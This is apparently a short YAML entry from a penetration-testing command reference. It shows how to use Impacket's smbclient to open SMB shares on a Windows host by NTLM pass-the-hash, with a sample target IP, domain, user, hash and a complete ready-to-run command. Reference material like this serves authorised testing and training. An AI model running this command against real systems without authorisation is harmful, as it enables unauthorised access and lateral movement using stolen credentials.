---
description: Use Impacket's smbclient to connect to SMB shares on a Windows host using NTLM Pass-the-Hash authentication.

Command Reference:
    Target IP: 10.10.10.1
    Domain: test.local
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  impacket-smbclient -hashes 00000000000000000000000000000000:580B16D486D8D2CAFA00B314D41FA396 test.local/john@10.10.10.1

items:
  - Hash
  - SMB

services:
  - SMB
  - NTLM

OS:
  - Windows

attack_types:
  - Enumeration

references:
  - https://github.com/fortra/impacket
  - https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview
---
